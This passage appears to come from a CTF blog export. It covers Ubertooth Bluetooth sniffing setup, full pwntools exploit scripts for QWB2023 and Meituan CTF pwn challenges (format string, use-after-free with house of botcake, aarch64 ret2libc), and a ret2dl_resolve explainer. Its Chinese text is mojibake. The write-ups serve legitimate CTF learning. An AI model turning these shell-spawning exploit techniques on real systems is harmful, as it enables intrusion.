libbtbb-2020-12-R1mkdir buildcd buildcmake ..makesudo make installsudo ldconfig\nubertooth toolsï¼š\nwget https://github.com/greatscottgadgets/ubertooth/releases/download/2020-12-R1/ubertooth-2020-12-R1.tar.xztar -xf ubertooth-2020-12-R1.tar.xzcd ubertooth-2020-12-R1/hostmkdir buildcd buildcmake ..makesudo make installsudo ldconfig\nè£…wiresharkå’Œubertoothæ’ä»¶ä»¥ä¸‹cmakeçš„æ—¶å€™ä¼šæœ‰é—®é¢˜\nsudo apt-get install wireshark wireshark-dev libwireshark-dev cmakecd libbtbb-2020-12-R1/wireshark/plugins/btbbmkdir buildcd buildcmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/aarch-linux-gnu/wireshark/plugins/4.0/epan .. makesudo make install\næˆ‘çæåšäº†ä»¥ä¸‹æ“ä½œ\nexport C_INCLUDE_PATH=/usr/include/wiresharkexport CPLUS_INCLUDE_PATH=/usr/include/wireshark\nç„¶ååœ¨&#x2F;usr&#x2F;include&#x2F;wiresharkä¸‹ç»™ä»–åˆ›äº†ä¸€ä¸ªconfig.hï¼ˆå•¥éƒ½æ²¡å†™çš„ï¼‰ç¼–è¯‘å°±è¿‡äº† :) è™½ç„¶å¾ˆå¤šè­¦å‘Š\nä»¥ä¸‹åŒç†ï¼Œå®‰è£…è“ç‰™æ’ä»¶\nsudo apt-get install wireshark wireshark-dev libwireshark-dev cmakecd libbtbb-2020-12-R1/wireshark/plugins/btbredrmkdir buildcd buildcmake -DCMAKE_INSTALL_LIBDIR=/usr/lib/aarch-linux-gnu/wireshark/plugins/4.0/epan ..makesudo make install\nè®¾ç½®wiresharkæƒé™\nsudo groupadd wiresharksudo chgrp wireshark /usr/bin/dumpcapsudo chmod 4755 /usr/bin/dumpcapsudo gpasswd -a ä½ çš„ç”¨æˆ·å wireshark\n\nå¼€å†²åœ¨tmpä¸‹\nrm pipemkfifo pipe\nç„¶ååœ¨wiresharkè®¾ç½®ï¼ˆè¿™é‡Œæ²¡æˆªå›¾ï¼Œç”¨äº†æˆ‘ubuntuä¸Šçš„wiresharkï¼Œä½†æ˜¯åŒç†ï¼‰ç„¶ååœ¨å‘½ä»¤è¡Œ\nubertooth-btle -f -c /tmp/pipe\néœ€è¦æ³¨æ„çš„æ˜¯ä»¥ä¸Šä¸¤ä¸ªæ­¥éª¤ä¸èƒ½åè¿‡æ¥ï¼Œä¼šæœ‰é—®é¢˜ç„¶åå°±å¯ä»¥å¼€å§‹å—…æ¢äº†å¯ä»¥çœ‹åˆ°wiresharkä¸­çš„æŠ“åŒ…å†…å®¹\nåç»­å›å­¦æ ¡ä¹‹åä¸çŸ¥é“ä¸ºä»€ä¹ˆmicro-HDMIè¿ä¸ä¸Šå±å¹•äº†ï¼Œä¸å¾—å·²è¿˜æ˜¯å¾—æä¸ªvncï¼Œè®°å½•ä¸€ä¸‹\nå‘½ä»¤è¡Œ\nsudo raspi-config\nç„¶å\nè¿œç¨‹æ¡Œé¢æ­£å¸¸è¿æ¥å°±è¡Œ\n","categories":["plays"],"tags":["plays"]},{"title":"qwb2023","url":"/2023/12/20/qwb2023/","content":"qwb_pwné™„ä»¶ä¸‹è½½ï¼Œè¯·æ³¨æ„ä¸ºåŠ¨æ€é™„ä»¶ï¼ˆåº”è¯¥pwnæ²¡å½±å“å§ï¼‰qwb2023_wp_written_by_Hor1zonå¼ºç½‘å…ˆé”‹å¤–å•¥ä¹Ÿä¸ä¼šï¼Œæ˜å¹´å†æ¥\n[qwb2023 å¼ºç½‘å…ˆé”‹-ez_fmt]checksec: vuln:giftä¼šæ³„éœ²æ ˆé¡¶åœ°å€ï¼ŒåŠ¨è°ƒå¯ä»¥ç®—å‡ºretå‚æ•°çš„åœ°å€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»»æ„åœ°å€å†™ï¼Œå¯ä»¥åŠ«æŒè¿”å›åœ°å€ï¼Œåˆ©ç”¨printfå‡½æ•°æ³„éœ²libcåœ°å€ç»™äº†libcæ–‡ä»¶ï¼Œç›´æ¥å°è¯•æ‰“one_gadget\nfrom pwn import *from pwn import p64def debug():    gdb.attach(p)    pause()#r=remote(&#x27;47.104.24.40&#x27;,1337)p=process(&#x27;./ez_fmt&#x27;)elf=ELF(&quot;./ez_fmt&quot;)libc=ELF(&quot;./libc-2.31.so&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)p.recvuntil(b&#x27;There is a gift for you &#x27;)stack_rsp=int(p.recv(14),16)#debug()#-----calc addrstack_printf_ret = stack_rsp - 0x8stack_ret = stack_rsp + 0x78stack_printf = stack_rsp + 0x158success(&#x27;stack_rsp: %s&#x27;,hex(stack_rsp))success(&#x27;stack_ret: %s&#x27;,hex(stack_ret))success(&#x27;stack_printf %s&#x27;,hex(stack_printf))ogg1 = 0xe3afeogg2 = 0xe3b01ogg3 = 0xe3b04stack_printf_ret_addr = stack_printf_ret &amp; 0xffffsuccess(&#x27;stack_printf_ret_addr %s&#x27;,hex(stack_printf_ret_addr))#debug()#-----hijack ret_addr&amp;&amp;leak libc_basepayload=b&#x27;%19$p&#x27;payload+=b&#x27;%&#x27;+str(0x1205-6-8).encode()+b&#x27;c%10$hn&#x27;payload=payload.ljust(0x20,b&#x27;a&#x27;)payload+=p64(stack_printf_ret)p.send(payload)print(b&quot;[*]p1=&quot; + payload)p.recvuntil(b&#x27;0x&#x27;)libc_base=int(p.recv(12),16) - 0xf3 - libc.sym[&#x27;__libc_start_main&#x27;]one=libc_base+ogg2one1=one&amp;0xffffone2=(one&gt;&gt;16)&amp;0xffffsuccess(&#x27;libc_base: %s&#x27;,hex(libc_base))payload=b&#x27;%&#x27;+str(one2).encode()+b&#x27;c%10$hn&#x27;payload+=b&#x27;%&#x27;+str(one1-one2).encode()+b&#x27;c%11$hn&#x27;payload=payload.ljust(0x20,b&#x27;a&#x27;)payload+=p64(stack_ret-0x10+2)+p64(stack_ret-0x10)p.send(payload)print(b&quot;[*]p2=&quot; + payload)p.interactive()\n\n\n[qwb2023 pwn-chatting]é€†å‘å°±æ­»äº† :(é¦–å…ˆæ˜¯64ä½linuxçš„cppï¼Œä¿æŠ¤å…¨å¼€ï¼Œglibc &#x3D; 2.27ç¨‹åºå®ç°äº†ä¸€ä¸ªé€šè®¯å½•ï¼ŒåŠŸèƒ½åˆ†åˆ«ä¸ºï¼šæ·»åŠ ã€åˆ é™¤ã€åˆ—å‡ºç”¨æˆ·ï¼Œå‘é€å’Œè¯»å–messageå‘ç°ä¸€å¤„UAFï¼šé¦–å…ˆç¨‹åºé‡Œæœ‰ä¸¤ä¸ªå­˜æ”¾ message çš„åœ°æ–¹ï¼š\nç¬¬ä¸€å¤„æ˜¯ 0x2112E0ï¼Œè¿™ä¸ª vector é‡Œé¢æœ‰è®¸å¤šä¸ª entryï¼Œæ¯ä¸ª entry å­˜æ”¾äº†æ‰€æœ‰æ”¶ä»¶äººä¸ºæŸç”¨æˆ·çš„ messageã€‚ç¬¬äºŒå¤„æ˜¯ 0x211280ï¼ˆä¸‹å›¾çš„ LOCAL_MSGLIST_ENTRYï¼‰ï¼Œå¦‚æœ message çš„æ”¶ä»¶äººåˆšå¥½æ˜¯å½“å‰ç”¨æˆ· (CURR_USER)ï¼Œmessage ä¼šåŒæ—¶å­˜æ”¾è‡³ MSG_LIST å’Œ LOCAL_MSGLIST_ENTRä¸¤ä¸ªåœ°æ–¹å…±ç”¨äº†åŒä¸€ä¸ª message æŒ‡é’ˆæ¼æ´ç‚¹åœ¨äº deleteï¼šdelete ç”¨æˆ·æ—¶ï¼Œç¨‹åºä¼šé‡Šæ”¾å’Œæ¸…ç©º MSG_LIST ä¸­çš„ entry å’Œ message æŒ‡é’ˆ ï¼Œä½†æ²¡æœ‰æ¸…ç©ºLOCAL_MSGLIST_ENTRYçš„ message æŒ‡é’ˆã€‚\nå› æ­¤ï¼šé¦–å…ˆå‘é€ä¸€æ¡ message ç»™è‡ªå·±ï¼Œç„¶ååˆ é™¤å½“å‰ç”¨æˆ·ï¼Œå°±èƒ½ä½¿ç”¨ read åŠŸèƒ½è¯»å– LOCAL_MSGLIST_ENTRY ä¸­å·²é‡Šæ”¾ message æŒ‡é’ˆä¸Šçš„æ•°æ®ï¼Œä»è€Œæ³„æ¼å†…å­˜åœ°å€ã€‚\næ­¤å¤–ã€‚deleteä¸­å­˜åœ¨doublefreeæ¼æ´ã€‚\nè¿™é‡Œé€‰æ‹©ç”¨UAFæ³„éœ²åœ°å€\næ‰“house of botcake åŠ«æŒfree hook\n#!/usr/bin/env python3from pwn import *import warningswarnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)context(os =&quot;Linux&quot;,arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)#p = remote(&quot;101.200.122.251&quot;, 14509)p = process(&#x27;./chatting&#x27;)libc = ELF(&quot;./libc-2.27.so&quot;)def add(n):    p.sendlineafter(&quot;add&quot;, &quot; exit): &quot;)    p.sendlineafter(n, &quot;Enter new username: &quot;)    def delete(n):    p.sendlineafter(&quot;delete&quot;, &quot; exit): &quot;)    p.sendlineafter(n, &quot;Enter username to delete: &quot;)    def message(to, ctx):    p.sendlineafter(&quot;message&quot;, &quot; exit): &quot;)    p.sendlineafter(to, &quot;To:&quot;)    p.sendlineafter(len(ctx), &quot;Message size:&quot;)    p.sendlineafter(ctx, &quot;Content:&quot;)def listuser():    p.sendlineafter(&quot;listuser&quot;, &quot; exit): &quot;)    def read():    p.sendlineafter(&quot;read&quot;, &quot; exit): &quot;)def switch(n):    p.sendlineafter(&quot;switch&quot;, &quot; exit): &quot;)    p.sendlineafter(n, &quot;Enter username to switch to: &quot;)#  UAF p.sendline(&quot;str1k3&quot;)add(&quot;aaaa&quot;)add(&quot;bbbb&quot;)message(&quot;str1k3&quot;, &quot;a&quot;*0x500)message(&quot;xxxx&quot;, &quot;b&quot;*0x500)delete(&quot;str1k3&quot;) # BUG1message(&quot;xxxx&quot;, &quot;c&quot;*0x800)read()p.recvuntil(&quot;str1k3 -&gt; str1k3: &quot;)libc_base = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x3ec0d0success(&quot;libc_base: &quot;+ hex(libc_base))#  house of botcakeadd(&quot;A&quot;*0x80)add(&quot;B&quot;*0x80)add(&quot;C&quot;*0x80)add(&quot;D&quot;*0x80)add(&quot;E&quot;*0x80)add(&quot;F&quot;*0x80)switch(&quot;F&quot;*0x80)for i in range(7):    message(&quot;F&quot;*0x80, str(i)*0x80) # äº‹å…ˆåˆ›å»ºå¤§é‡ 0x90 ç©ºé—²å †å—ä¿æŠ¤ unsorted bin chunkread()switch(&quot;A&quot;*0x80)message(&quot;A&quot;*0x80, &quot;a&quot;*0x100)switch(&quot;B&quot;*0x80)message(&quot;B&quot;*0x80, &quot;b&quot;*0x100)switch(&quot;C&quot;*0x80)for i in range(7):    message(&quot;C&quot;*0x80, str(i)*0x100) # å¡«å…… tcache binread()switch(&quot;A&quot;*0x80)read()switch(&quot;B&quot;*0x80)read()switch(&quot;bbbb&quot;)message(&quot;xxxx&quot;, &quot;a&quot;*0x100)switch(&quot;B&quot;*0x80) read() # BUG2ï¼ŒDouble freeï¼Œchunk åŒæ—¶ä½äº unosorted bin å’Œ tcache# free_hookswitch(&quot;bbbb&quot;)pp = b&#x27;A&#x27;*0x100+flat([0, 0x111, libc_base+0x3ed8e0])message(&quot;xxxx&quot;, pp.ljust(0x200)) # ç¯¡æ”¹ tcache chunk fd ä¸º free_hookswitch(&quot;D&quot;*0x80)message(&quot;D&quot;*0x80, b&quot;/bin/sh&quot;.ljust(0x100, b&#x27;\\x00&#x27;))message(&quot;bbbb&quot;, (p64(0)+p64(libc.symbols[&quot;system&quot;])).ljust(0x100, b&#x27;\\x00&#x27;)) # è¦†ç›– free_hook ä¸º systemread() # é‡Šæ”¾ &quot;/bin/sh&quot;p.interactive()","categories":["wp"],"tags":["wp"]},{"title":"ret2libc_in_aarch64","url":"/2024/04/12/ret2libc-in-arm/","content":"[ç¾å›¢CTF2022 ret2libc_aarch64]*é™„ä»¶ä¸‹è½½åªå¼€äº†NXï¼ˆqemuç¯å¢ƒéšæœºåŒ–å°±ç®—å¼€äº†ä¹Ÿ&#x3D;æ²¡å¼€ï¼‰mainleakå‡½æ•°ï¼Œè¾“å…¥puts_got_addrèƒ½å¤Ÿæ³„éœ²putsåœ°å€è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œaarch64ä¸­libcåœ°å€å­˜åœ¨&#x2F;x00æˆªæ–­å¯ä»¥åªæ³„éœ²ä½ä½ï¼Œå†åŠ å›å»\nputs_got =elf.got[&#x27;puts&#x27;]p.recvuntil(&quot;&gt;&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;sensible&gt;&gt;\\n&quot;)p.send(p64(puts_got))puts_addr = u64(p.recv(3).ljust(8, b&#x27;\\x00&#x27;))+ 0x4000000000libc_base = puts_addr   - libc.sym[&#x27;puts&#x27;]success(&quot;libc_base : %s&quot;,libc_base)\n\noverflowé‡Œæœ‰ä¸€æ¬¡æº¢å‡ºç»™äº†libcï¼Œå¯ä»¥æ‰“ret2libcã€‚\nROPgadgetå‘ç°elfæ–‡ä»¶å†…æ²¡æœ‰ä»€ä¹ˆå¯ä»¥ç”¨çš„gadgetï¼Œåªèƒ½å»libcé‡Œæ‰¾äº†ï¼Œå¾€ldr x0ä¸Šæ‰¾æœ€åæ‰¾åˆ°å¯ä»¥ç”¨è¿™ä¸ª\n#0x0000000000063e5c : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret\nè¿™ä¸ªgadgetä¼šæŠŠsp+0x18ä½ç½®çš„å€¼èµ‹å€¼ç»™x0å…ˆæ‰“ä¸€åŠæ³„éœ²åœ°å€\n[+] puts_addr : 0x40008ab928[+] libc_base : 0x4000846000[+] gadget : 0x40008a9e5c\nç„¶åæ–­ç‚¹ä¸‹åˆ°gadgetï¼Œé«˜äº®å°±æ˜¯éœ€è¦ä¼ å…¥systemçš„åœ°æ–¹(åœ°å€)æ‰€ä»¥ropchainå¦‚ä¸‹\npayload = b&#x27;a&#x27;*128 +b&#x27;b&#x27;*8 + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)\n\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;aarch64&#x27;, log_level=&#x27;debug&#x27;)#socat tcp-l:10002,fork exec:&quot;qemu-aarch64 -g 2345 -L /usr/aarch64-linux-gnu  ./pwn&quot;;reuseaddr#p = process([&quot;qemu-aarch64&quot;,&quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])p = process([&quot;qemu-aarch64&quot;,&quot;-g&quot;,&quot;2345&quot;,&quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])#p = remote(&quot;127.0.0.1&quot;,10002)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)puts_got =elf.got[&#x27;puts&#x27;]p.sendlineafter(b&quot;&gt;&quot;, &quot;1&quot;)p.sendafter(&quot;sensible&gt;&gt;\\n&quot;, p64(puts_got))p.send(p64(puts_got))puts_addr = u64(p.recv(3).ljust(8, b&#x27;\\x00&#x27;))+ 0x4000000000success(&quot;puts_addr : %s&quot;,hex(puts_addr))libc_base = puts_addr   - libc.sym[&#x27;puts&#x27;]success(&quot;libc_base : %s&quot;,hex(libc_base))system = libc_base + libc.sym[&#x27;system&#x27;]binsh = libc_base + (next(libc.search(b&#x27;/bin/sh&#x27;)))#0x0000000000063e5c : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; retgadget = libc_base + 0x63e5csuccess(&quot;gadget : %s&quot;,gadget)p.sendlineafter(b&quot;&gt;&quot;, &quot;2&quot;)pause()payload = b&#x27;a&#x27;*128 +b&#x27;b&#x27;*8 + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)p.sendlineafter(&quot;sensible&gt;&gt;&quot;, payload)p.interactive()\n"},{"title":"ret2dl_resolve","url":"/2023/12/06/ret2dl-resolve/","content":"é€‚ç”¨äºæ— æ³•leakä¿¡æ¯çš„æ ˆæº¢å‡ºåŠ¨æ€è£…è½½å™¨è´Ÿè´µå°†äºŒè¿›åˆ¶æ–‡ä»¶åŠä¾èµ–åº“åŠ è½½åˆ°å†…å­˜ï¼Œè¯¥è¿‡ç¨‹åŒ…å«äº†å¯¹å¯¼å…¥ç¬¦å·ï¼ˆå‡½æ•°å’Œå…¨å±€å˜é‡ï¼‰çš„è§£æã€‚æ¯ä¸ªç¬¦å·éƒ½æ˜¯ä¸€ä¸ªElf_Symç»“æ„ä½“çš„å®ä¾‹ï¼Œè¿™äº›ç¬¦å·åˆå…±åŒç»„æˆäº†.dynsymæ®µã€‚Elf_Symç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºã€‚\n/*Symbol table entry.*/typedef struct&#123;    Elf32_Word      st name;/*Symbol name (string tbl index)*/    Elf32_Addr      st_value;/*Symbol value*/    Elf32_Word      st_size;/*Symbol size*/    unsigned char   st info;/*Symbol type and binding */    unsigned char   st_other;/*Symbol visibility*/    Elf32_Section   st shndx;/*Section index*/&#125;Elf32_Sym;/*How to extract and insert information held in the st info field.*/#define ELF32_ST_BIND(val)      (((unsigned char)(val))&gt;&gt;4)#define ELF32_ST_TYPE(val)      ((va1)&amp;0xf)#define ELF32_ST_INFO(bind,type)((bind) &lt;&lt; 4)+((type) &amp;0xf)\nå…¶ä¸­st_nameåŸŸæ˜¯ç›¸å¯¹äº.dynstræ®µçš„åç§»ï¼Œä¿å­˜ç¬¦å·åå­—ç¬¦ä¸²ï¼›st_valueåŸŸæ˜¯å½“ç¬¦å·è¢«å¯¼å‡ºæ—¶ç”¨äºå­˜æ”¾è™šæ‹Ÿåœ°å€çš„ï¼Œä¸å¯¼å‡ºæ—¶åˆ™ä¸ºNULLã€‚\nå¯¼å…¥ç¬¦å·çš„è§£æéœ€è¦è¿›è¡Œé‡å®šä½ï¼Œæ¯ä¸ªé‡å®šä½é¡¹éƒ½æ˜¯ä¸€ä¸ªELF_Relç»“æ„ä½“çš„å®ä¾‹è¿™äº›é¡¹åˆå…±åŒç»„æˆäº†.rl.pltæ®µï¼ˆç”¨äºå¯¼å…¥å‡½æ•°ï¼‰å’Œ.rel.dynæ®µï¼ˆç”¨äºå¯¼å…¥å…¨å±€å˜é‡ï¼‰ã€‚Elf_Relç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºã€‚\n/*Relocation table entry without addend (in section of type SHT_REL).*/typedef struct&#123;    Elf32_Addr r_offset;/*Address*/    Elf32_Word r_info;/*Relocation type and symbol index*/&#125; Elf32_Rel;/*How to extract and insert information held in the r info field.*/#define ELF32_R_SYM(val)        ((val)&gt;&gt;8)#define ELF32_R_TYPE(val)       ((val)&amp; Oxff)#define ELF32_R_INFO(sym,type)  (((sym)&lt;&lt;8)((type)&amp;0xff))\nå…¶ä¸­r_offset.åŸŸç”¨äºä¿å­˜è§£æåçš„ç¬¦å·åœ°å€å†™å…¥å†…å­˜çš„ä½ç½®ï¼ˆç»å¯¹åœ°å€ï¼‰ï¼ŒrinfoåŸŸçš„é«˜ä½3ä¸ªå­—èŠ‚ç”¨äºæ ‡è¯†è¯¥ç¬¦å·åœ¨.dynsymæ®µä¸­çš„ä½ç½®ï¼ˆæ— ç¬¦å·ä¸‹æ ‡ï¼‰ã€‚\nå› æ­¤ï¼Œå½“ç¨‹åºå¯¼å…¥ä¸€ä¸ªå‡½æ•°æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šåŒæ—¶åœ¨.dynstræ®µä¸­æ·»åŠ ä¸€ä¸ªå‡½æ•°åå­—ç¬¦ä¸²ï¼Œåœ¨.dynsymæ®µä¸­æ·»åŠ ä¸€ä¸ªæŒ‡å‘å‡½æ•°åå­—ç¬¦ä¸²çš„EIf_Sym,åœ¨.rel.pltæ®µä¸­æ·»åŠ ä¸€ä¸ªæŒ‡å‘EIf_Symçš„Elf_Relã€‚æœ€åï¼Œè¿™äº›Elf_Relçš„r_offsetåŸŸåˆæ„æˆäº†GOTè¡¨ï¼Œä¿å­˜åœ¨.got.pltæ®µä¸­ã€‚ç”±äºå¼•å…¥äº†å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œç¬¦å·çš„è§£æåªæœ‰åœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨çš„æ—¶å€™æ‰è¿›è¡Œï¼Œè¯¥è¿‡ç¨‹æ˜¯é€šè¿‡PLTè¡¨è¿›è¡Œçš„ã€‚æ¯ä¸ªå¯¼å…¥å‡½æ•°éƒ½åœ¨PLTè¡¨ä¸­æœ‰ä¸€ä¸ªæ¡ç›®ï¼Œå…¶ç¬¬1æ¡æŒ‡ä»¤æ— æ¡ä»¶è·³è½¬åˆ°å¯¹åº”G0Tæ¡ç›®ä¿å­˜çš„åœ°å€å¤„ã€‚è€Œæ¯ä¸ªGOTæ¡ç›®åœ¨åˆå§‹åŒ–æ—¶éƒ½é»˜è®¤æŒ‡å‘å¯¹åº”PLTæ¡ç›®çš„ç¬¬2æ¡æŒ‡ä»¤çš„ä½ç½®ï¼Œç›¸å½“äºåˆè·³å›æ¥äº†ã€‚æ­¤æ—¶ç»§ç»­æ‰§è¡ŒPLTçš„åä¸¤æ¡æŒ‡ä»¤ï¼Œå…ˆå°†å¯¼å…¥å‡½æ•°çš„æ ‡è¯†(Elf_Relåœ¨.rel.pltæ®µä¸­çš„åç§»)å‹æ ˆï¼Œç„¶åè·³è½¬åˆ°PLT0æ‰§è¡Œã€‚PLT0åŒ…å«ä¸¤æ¡æŒ‡ä»¤ï¼Œå…ˆå°†GOT[1]çš„å€¼ï¼ˆä¸€ä¸ªlink_mapå¯¹è±¡çš„åœ°å€ï¼‰å‹æ ˆï¼Œç„¶åè·³è½¬åˆ°GOT[2]ä¿å­˜åˆ°åœ°å€å¤„ä¹Ÿå°±æ˜¯_dl_runtime_resolve()å‡½æ•°ã€‚å‡½æ•°å‚æ•°link_map_objç”¨äºè·å–è§£æå¯¼å…¥å‡½æ•°æ‰€éœ€çš„ä¿¡æ¯ï¼Œå‚æ•°reloc_.indoxåˆ™æ ‡è¯†äº†è§£æå“ªä¸€ä¸ªå¯¼å…¥å‡½æ•°ã€‚è§£æå®Œæˆåï¼Œç›¸åº”çš„GOTæ¡ç›®ä¼šè¢«ä¿®æ”¹ä¸ºæ­£ç¡®çš„å‡½æ•°åœ°å€ï¼Œæ­¤åç¨‹åºå†è°ƒç”¨è¯¥å‡½æ•°æ—¶å°±ä¸éœ€è¦å†æ¬¡è¿›è¡Œè§£æäº†ã€‚\nåœ¨i386ä¸‹ï¼Œ_dl_runtime_resolve()ç”±æ±‡ç¼–å®ç°ï¼Œå¦‚ä¸‹\nå…¶ä¸­ï¼Œ_dl_fixup()å‡½æ•°åœ¨&#x2F;elf&#x2F;dl-runtime.cä¸­å®ç°ï¼Œç”¨äºè§£æå¯¼å…¥å‡½æ•°çš„çœŸå®åœ°å€ï¼Œå¹¶æ”¹å†™GOT,å¦‚ä¸‹æ³¨æ„ï¼Œè¿™é‡Œæ˜¯glibc2.31çš„å®ç°\nDL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\t   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif\t   struct link_map *l, ElfW(Word) reloc_arg)&#123;  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  const ElfW(Sym) *refsym = sym;  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);//å¯¹åº”gotè¡¨åœ°å€  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);//æ£€æŸ¥   /* Look up the target symbol.  If the normal lookup rules are not      used don&#x27;t look in the global scope.  */  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    &#123;      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t&#123;\t  const ElfW(Half) *vernum =\t    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t  version = &amp;l-&gt;l_versions[ndx];\t  if (version-&gt;hash == 0)\t    version = NULL;\t&#125;      /* We need to keep the scope around so do some locking.  This is\t not necessary for objects which cannot be unloaded or when\t we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)\t&#123;\t  THREAD_GSCOPE_SET_FLAG ();\t  flags |= DL_LOOKUP_GSCOPE_LOCK;\t&#125;#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t    version, ELF_RTYPE_CLASS_PLT, flags, NULL);//æ‰¾åˆ°å¯¹åº”libcï¼Œè¿”å›æŒ‡å‘libc_baseçš„æŒ‡é’ˆ      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)\tTHREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      /* Currently result contains the base load address (or link map)\t of the object that defines sym.  Now add in the symbol\t offset.  */      value = DL_FIXUP_MAKE_VALUE (result,\t\t\t\t   SYMBOL_ADDRESS (result, sym, false));//è·å¾—å‡½æ•°çœŸå®åœ°å€    &#125;  else    &#123;      /* We already found the symbol.  The module (and therefore its load\t address) is also known.  */      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));      result = l;    &#125;  /* And now perhaps the relocation addend.  */  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__glibc_unlikely (GLRO(dl_bind_not)))    return value;  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); //å†™å…¥gotè¡¨&#125;\n\næ­¤å¤–ï¼Œç”±äºRELROä¿æŠ¤æœºåˆ¶ä¼šå½±å“å»¶è¿Ÿç»‘å®šï¼Œå› æ­¤ä¹Ÿä¼šå½±å“ret2dl-resolve:Partial RELRO:åŒ…æ‹¬.dynamicæ®µåœ¨å†…çš„ä¸€äº›æ®µä¼šè¢«æ ‡è¯†ä¸ºåªè¯»ã€‚Full RELRO:åœ¨Partial RELROçš„åŸºç¡€ä¸Šï¼Œç¦ç”¨å»¶è¿Ÿç»‘å®šï¼Œå³æ‰€æœ‰çš„å¯¼å…¥ç¬¦å·åœ¨åŠ è½½æ—¶å°±è¢«è§£æï¼Œ.got.ptæ®µè¢«å®Œå…¨åˆå§‹åŒ–ä¸ºç›®æ ‡å‡½æ•°çš„åœ°å€ï¼Œå¹¶æ ‡è®°ä¸ºåªè¯»ã€‚\n(1)å…³é—­RELROä¿æŠ¤ï¼Œä½¿.dynamicæ®µå¯å†™æ—¶ï¼šç”±äºåŠ¨æ€è£…è½½å™¨æ˜¯ä».dynamic.æ®µçš„DT_STRTABæ¡ç›®ä¸­æ¥è·å–.dynstræ®µçš„åœ°å€ï¼Œè€ŒDT_STRTABçš„ä½ç½®æ˜¯å·±çŸ¥çš„ï¼Œä¸”é»˜è®¤æƒ…å†µä¸‹å¯å†™ï¼Œæ‰€ä»¥æ”»å‡»è€…èƒ½å¤Ÿæ”¹å†™DT_STRTABçš„å†…å®¹ï¼Œæ¬ºéª—åŠ¨æ€è£…è½½å™¨ï¼Œä½¿å®ƒä»¥ä¸º.dynstr.æ®µåœ¨.bSsä¸Šï¼ŒåŒæ—¶åœ¨é‚£é‡Œä¼ªé€ ä¸€ä¸ªå‡çš„å­—ç¬¦ä¸²è¡¨ã€‚å½“åŠ¨æ€è£…è½½å™¨å°è¯•è§£æprintf()æ—¶å°±ä¼šä½¿ç”¨ä¸åŒçš„åŸºåœ°å€æ¥å¯»æ‰¾å‡½æ•°åï¼Œæœ€ç»ˆæ‰§è¡Œçš„æ˜¯execve().(2)å¼€å¯Partial RELROä¿æŠ¤ï¼Œä½¿.dynamicæ®µä¸å¯å†™æ—¶ï¼šæˆ‘ä»¬çŸ¥é“_dl_runtime_resolve()çš„ç¬¬äºŒä¸ªå‚æ•°reloc_.indexå¯¹åº”Elf_Relåœ¨.rel.pltæ®µä¸­çš„åç§»ï¼ŒåŠ¨æ€è£…è½½å™¨å°†å…¶åŠ ä¸Š.rel.pltçš„åŸºåœ°å€æ¥å¾—åˆ°ç›®æ ‡Elf 